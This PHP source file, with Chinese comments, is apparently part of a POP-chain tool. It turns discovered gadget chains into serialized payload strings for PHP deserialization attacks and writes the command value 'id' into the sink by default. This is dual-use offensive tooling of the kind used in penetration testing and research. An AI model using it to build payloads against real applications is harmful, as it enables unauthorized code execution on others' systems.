<?php
declare(strict_types=1);

namespace PopChain\Payload;

use PopChain\Model\ArgInfo;
use PopChain\Model\Chain;
use PopChain\Model\ClassInfo;
use PopChain\Model\Edge;
use PopChain\Model\PropertyInfo;

/**
 * 把一条 Chain 转成可提交的序列化字符串。
 *
 * 只有"经过属性把控制权交给另一个对象"的边才会在 payload 里生成新节点；
 * $this->m(...) / self::m(...) / Foo::m(...) 这类边仍在同一个对象上执行，
 * 不产生新节点，也不应该往 payload 里塞伪属性。
 */
final class PayloadBuilder
{
    /** 最近一次 build() 是否真的把 sink 值写进了 payload。 */
    public bool $sinkValueWritten = false;

    /** @param array<string, ClassInfo> $classes */
    public function __construct(private array $classes)
    {
    }

    public function build(Chain $chain, mixed $value = 'id'): string
    {
        $this->sinkValueWritten = false;
        $nodes = [0 => new PayloadNode($chain->entryClass->name)];
        $current = 0;

        /** @var array<int, int> $fromNode 边索引 => from 方法所在对象的节点索引 */
        $fromNode = [];

        foreach ($chain->edges as $index => $edge) {
            $fromNode[$index] = $current;
            if ($this->isInternalEdge($edge)) {
                continue;
            }
            $next = new PayloadNode($edge->toClass->name);
            // 属性属于 fromClass（当前这个对象），不是下一个 gadget 的类
            $this->setProperty($nodes[$current], $edge->fromClass, $edge->viaProperty, $next);
            $current++;
            $nodes[$current] = $next;
        }

        $this->fillRequiredArrayArgs($chain, $nodes, $fromNode);
        $this->applySinkValue($chain, $nodes, $fromNode, $current, $value);

        return (new Serializer())->serializeNode($nodes[0]);
    }

    /** 方法调用 / 静态调用不改变对象图，只是同一个对象内的跳转。 */
    private function isInternalEdge(Edge $edge): bool
    {
        return $edge->viaProperty === '(this)' || $edge->viaProperty === '(static)';
    }

    /**
     * @param array<int, PayloadNode> $nodes
     * @param array<int, int> $fromNode
     */
    private function applySinkValue(Chain $chain, array $nodes, array $fromNode, int $sinkNode, mixed $value): void
    {
        $hit = $chain->sink;
        if ($hit === null || !isset($nodes[$sinkNode])) {
            return;
        }

        $sinkClass = $chain->sinkObjectClass();
        if ($sinkClass === null) {
            return;
        }

        $arg = $hit->arg;
        $target = $arg->targetProperty();
        if ($target !== null && $this->isWritableArg($arg)) {
            $this->setProperty($nodes[$sinkNode], $sinkClass, $target, $value);
            $this->sinkValueWritten = true;
            return;
        }

        if ($arg->kind === ArgInfo::VARIABLE && $arg->name !== null) {
            $position = $chain->sinkObjectMethod()?->paramNamed($arg->name)?->position;
            if ($position !== null) {
                $this->sinkValueWritten = $this->backtrack(
                    $chain,
                    $fromNode,
                    count($chain->edges) - 1,
                    $position,
                    $value,
                    $nodes,
                );
            }
        }
    }

    /**
     * 回调通过数组传参时，payload 里必须有这个数组属性，否则被调方法的必需参数拿不到值。
     * 这里给没被 sink 值覆盖到的数组属性补一个占位元素。
     *
     * @param array<int, PayloadNode> $nodes
     * @param array<int, int> $fromNode
     */
    private function fillRequiredArrayArgs(Chain $chain, array $nodes, array $fromNode): void
    {
        foreach ($chain->edges as $index => $edge) {
            foreach ($edge->argMapping as $arg) {
                if ($arg->kind !== ArgInfo::ARRAY_ELEMENT || $arg->name === null) {
                    continue;
                }
                $nodeIndex = $fromNode[$index] ?? 0;
                if (!isset($nodes[$nodeIndex])) {
                    continue;
                }
                if ($nodes[$nodeIndex]->has($arg->name)) {
                    continue;
                }
                $this->setProperty(
                    $nodes[$nodeIndex],
                    $edge->fromClass,
                    $arg->name,
                    $this->arrayValue((int) $arg->literal, ''),
                );
            }
        }
    }

    /** 只有属性和字符串拼接可以写入 payload；回调数组等由边本身决定。 */
    private function isWritableArg(ArgInfo $arg): bool
    {
        return $arg->kind === ArgInfo::THIS_PROPERTY || $arg->kind === ArgInfo::CONCAT;
    }

    /**
     * 沿边反向找回"这个 sink 参数是从哪个属性传进来的"。
     *
     * @param array<int, int> $fromNode
     * @param array<int, PayloadNode> $nodes
     */
    private function backtrack(
        Chain $chain,
        array $fromNode,
        int $edgeIndex,
        int $position,
        mixed $value,
        array $nodes,
    ): bool {
        if ($edgeIndex < 0) {
            return false;
        }

        $edge = $chain->edges[$edgeIndex];
        $arg = $edge->argMapping[$position] ?? null;
        if ($arg === null) {
            return false;
        }

        $nodeIndex = $fromNode[$edgeIndex] ?? 0;

        if ($arg->kind === ArgInfo::THIS_PROPERTY && $arg->name !== null) {
            $this->setProperty($nodes[$nodeIndex], $edge->fromClass, $arg->name, $value);
            return true;
        }

        if ($arg->kind === ArgInfo::CONCAT && $arg->targetProperty() !== null) {
            $this->setProperty($nodes[$nodeIndex], $edge->fromClass, (string) $arg->targetProperty(), $value);
            return true;
        }

        // 入口魔术方法的参数数组元素（$data['cmd']）：写同名属性，unserialize 会把它交给 __unserialize
        if ($arg->kind === ArgInfo::PARAM_ELEMENT && is_string($arg->literal)) {
            $nodes[$nodeIndex]->set($arg->literal, $value, 'public', $edge->fromClass->name);
            return true;
        }

        // 回调通过数组传参：写数组值，而不是标量（否则运行时是 TypeError）
        if ($arg->kind === ArgInfo::ARRAY_ELEMENT && $arg->name !== null) {
            $this->setProperty($nodes[$nodeIndex], $edge->fromClass, $arg->name, $this->arrayValue((int) $arg->literal, $value));
            return true;
        }

        if ($arg->kind === ArgInfo::VARIABLE && $arg->name !== null) {
            $parentPosition = $edge->fromMethod->paramNamed($arg->name)?->position;
            if ($parentPosition !== null) {
                return $this->backtrack($chain, $fromNode, $edgeIndex - 1, $parentPosition, $value, $nodes);
            }
        }

        return false;
    }

    /** 构造一个前 n 项占位、第 n 项为目标值的数组。 */
    private function arrayValue(int $index, mixed $value): array
    {
        $array = [];
        for ($position = 0; $position < $index; $position++) {
            $array[] = '';
        }
        $array[] = $value;
        return $array;
    }

    private function setProperty(PayloadNode $node, ClassInfo $class, string $name, mixed $value): void
    {
        $property = $this->findProperty($class, $name);
        $node->set(
            $name,
            $value,
            $property?->visibility ?? 'public',
            $property?->declaringClass ?? $class->name,
        );
    }

    private function findProperty(ClassInfo $class, string $name): ?PropertyInfo
    {
        $seen = [];
        $current = $class;
        while ($current !== null && !isset($seen[$current->name])) {
            $seen[$current->name] = true;
            $property = $current->property($name);
            if ($property !== null) {
                return $property;
            }
            $current = $current->parent !== null ? ($this->classes[$current->parent] ?? null) : null;
        }
        return null;
    }
}
